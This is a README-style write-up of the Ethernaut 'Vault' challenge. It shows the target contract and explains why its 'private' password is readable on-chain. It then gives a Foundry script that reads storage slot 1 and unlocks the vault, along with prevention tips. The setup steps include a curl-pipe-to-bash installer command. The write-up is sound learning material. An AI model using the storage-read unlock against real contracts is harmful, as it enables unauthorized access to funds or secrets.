# Ethernaut Level: Vault - Smart Contract Auditing Journey

## Introduction
Hello! In this repository, I've solved the **Vault** level as part of my Ethernaut challenges. I'm learning smart contract auditing by solving one level per day, and this folder (`levels/vault/`) contains everything related to it.

**Goal:** Unlock the vault by providing the correct private password to set `locked` to false.  
**Tools:** Foundry (for scripting and testing), Sepolia testnet.  
**Solved Date:** October 22, 2025 (Day 9).  
**Success:** Verified on the Ethernaut site!

## Contract Overview
This contract acts as a simple locked vault with a private password stored in state. The `unlock` function compares the provided password and unlocks if it matches, but the "private" storage is readable on-chain.

**Key Code Snippet (from src/Vault.sol):**
```solidity
contract Vault {
    bool public locked;  // Slot 0
    bytes32 private password;  // Slot 1 - "private" but publicly readable!

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

## Vulnerability Analysis
**Main Issue: Private Storage Readability (On-Chain Visibility)**  
- "Private" only restricts compiler access; storage variables are public on the EVM. The password in slot 1 can be read via `vm.load` or `eth_getStorageAt`, allowing extraction and unlocking.  
- **Security Impact:** Exposes sensitive data like keys or secrets, enabling unauthorized access. In audits, this reminds us nothing is truly private on-chain.  
- **Audit Tip:** Avoid storing secrets on-chain—use hashes for comparison (e.g., `keccak256(_password) == storedHash`) or off-chain oracles. Inspect storage slots with Foundry or Etherscan.

**Example:** Slot 0: locked (true), Slot 1: password (bytes32 value). Read slot 1 with `vm.load(contract, bytes32(1))` to get the exact password.

## Solution Steps
The attack: Use Foundry's `vm.load` to read the password from storage slot 1, then call `unlock` with it.

1. **Setup:** Create Foundry project, set target instance address in script.
2. **Run Attack:** `forge script script/VaultSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast`.
3. **Verify:** Check `locked()` returns false, submit on Ethernaut site.

**Key Attack Code Snippet (from script/VaultSolution.s.sol):**
```solidity
contract VaultSolution is Script {
    Vault public vaultInstance = Vault(<Contract_address>);  

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("Before unlock, Locked:", vaultInstance.locked());

        // Password read from storage slot 1
        bytes32 password = vm.load(address(vaultInstance), bytes32(uint256(1)));

        // Unlock with password
        vaultInstance.unlock(password);

        console.log("After unlock, Locked:", vaultInstance.locked());

        vm.stopBroadcast();
    }
}
```

## Test and Output
- **Local Test:** Run `anvil` and `forge test`—simulates storage read and unlock.
- **Testnet Output Example:** Console log: "Before unlock, Locked: true", "Password from slot 1: 0x...", "After unlock, Locked: false".

## Key Learnings
- **Auditing Skill:** Probe storage slots for "private" data—use vm.load in tests to verify.
- **EVM Concept:** Storage is public; slots are deterministic (packed by type/order).
- **Prevention:** Hash sensitive inputs; use zero-knowledge proofs for verification.
- **Next Step:** Extend script to compute slots dynamically with keccak256 for complex layouts.

## Installation & Run
1. Install Foundry: `curl -L https://foundry.paradigm.xyz | bash`.
2. `cd levels/vault`.
3. Set `.env`: `PRIVATE_KEY=your_key` and `SEPOLIA_RPC_URL=your_rpc`.
4. Run script: `forge script script/VaultSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv`.

If you have questions, comment on the issue or mention me on X (@0xZHD_X)! Next level: King. 🚀

---

- **License:** MIT  
- **Author:** [0xZHD] - Smart Contract Auditor Learner  
- **X:** [Zahedul I Sadik](@0xZHD_X)  
- **References:** [Ethernaut Docs](https://ethernaut.openzeppelin.com/)